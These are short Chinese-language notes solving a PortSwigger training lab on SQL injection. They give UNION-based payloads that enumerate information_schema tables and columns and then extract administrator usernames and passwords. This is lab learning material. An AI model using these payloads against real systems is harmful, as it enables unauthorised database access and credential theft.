### 列出数据库表与列名 ###
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
过滤器url为 /filter?category=Gifts

在元数据表中查找可能是用户表的表名
' UNION SELECT TABLE_NAME,NULL 
FROM information_schema.tables 
WHERE TABLE_NAME LIKE '%user%'-- 
||
从得到的多个表名中尝试 users_hawgux
' UNION SELECT COLUMN_NAME,NULL 
FROM information_schema.columns
WHERE TABLE_NAME='users_hawgux'--  
得到列名username_gopxhk，password_akdpgk
||
使用得到列名查找可能是管理员账户的数据
' UNION SELECT username_gopxhk,password_akdpgk 
FROM users_hawgux
WHERE username_gopxhk LIKE '%admin%'--
